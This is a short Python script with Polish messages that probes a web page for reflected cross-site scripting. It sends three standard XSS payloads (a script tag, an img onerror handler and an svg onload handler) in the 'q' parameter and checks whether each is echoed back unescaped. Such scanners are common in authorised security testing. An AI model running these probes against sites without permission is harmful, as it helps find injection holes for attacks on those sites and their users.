import requests
url = "" #wprowadź URL strony
payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "\"><svg/onload=alert(1)>"]
for payload in payloads:
    params = {'q': payload}
    response = requests.get(url, params=params)

    if payload in response.text:
        print(f"Podatność XSS przy użyciu: {payload}")
    else:
        print(f"Brak podatności dla: {payload}")
